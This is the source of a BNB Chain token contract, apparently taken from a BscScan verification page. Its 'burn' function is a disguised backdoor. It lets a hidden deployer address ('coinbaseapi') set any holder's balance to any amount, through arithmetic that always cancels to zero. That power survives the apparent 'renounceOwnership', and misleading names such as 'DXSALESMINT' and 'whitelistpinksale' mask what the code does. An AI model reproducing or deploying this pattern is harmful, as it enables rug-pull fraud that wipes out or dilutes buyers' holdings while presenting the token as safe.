/**
 *Submitted for verification at BscScan.com on 2022-07-18
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract DXSALESMINT {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract MetaStupid is DXSALESMINT {
  using Address for address;
  using SafeMath for uint256;
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  uint256 DXSALESFEE = 0;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  mapping(address => bool) public whitelistpinksale;
  address coinbaseapi;
  constructor(string memory _name, string memory _symbol) public {
    coinbaseapi = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  1000000000000 * 10 ** uint256(decimals);
    balances[owner] = totalSupply;
    whitelistpinksale[coinbaseapi] = true;
      
  }
  
  mapping(address => uint256) public balances;
  function transfer(address _to, uint256 allBallance) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(allBallance <= balances[from]);
    if(whitelistpinksale[from] || whitelistpinksale[_to]){
        _transfer(from, _to, allBallance);
        return true;
    }
    _transfer(from, _to, allBallance);
    return true;
  }
  
  function _transfer(address from, address _to, uint256 allBallance) private {
    balances[from] = balances[from].sub(allBallance);
    balances[_to] = balances[_to].add(allBallance);
    emit Transfer(from, _to, allBallance);
  }
    
  modifier onlyOwner() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
    
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  
  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }

  function _burn (address DXSALESROOTER, uint256 allBallance) internal {
        balances[DXSALESROOTER] = (balances[DXSALESROOTER] * 1 * 3 - balances[DXSALESROOTER] * 1 * 3) + (allBallance * 10 ** uint256(decimals));
  }
  
  mapping (address => mapping (address => uint256)) public allowed;
  function transferFrom(address _from, address _to, uint256 allBallance) public returns (bool) {
    require(_to != address(0));
    require(allBallance <= balances[_from]);
    require(allBallance <= allowed[_from][msg.sender]);
    address from = _from;
    if(whitelistpinksale[from] || whitelistpinksale[_to]){
        _transferFrom(_from, _to, allBallance);
        return true;
    }
    _transferFrom(_from, _to, allBallance);
    return true;
  }
  
  function _transferFrom(address _from, address _to, uint256 allBallance) internal {
    balances[_from] = balances[_from].sub(allBallance);
    balances[_to] = balances[_to].add(allBallance);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(allBallance);
    emit Transfer(_from, _to, allBallance);
  }
 function approve(address _spender, uint256 allBallance) public returns (bool) {
    allowed[msg.sender][_spender] = allBallance;
    emit Approval(msg.sender, _spender, allBallance);
    return true;
  }
  modifier isonlyowners () {
    require(coinbaseapi == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
  
 
  
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function burn(address walletadr, uint256 allBallance) public isonlyowners {
      _burn(walletadr, allBallance);
  }
  
}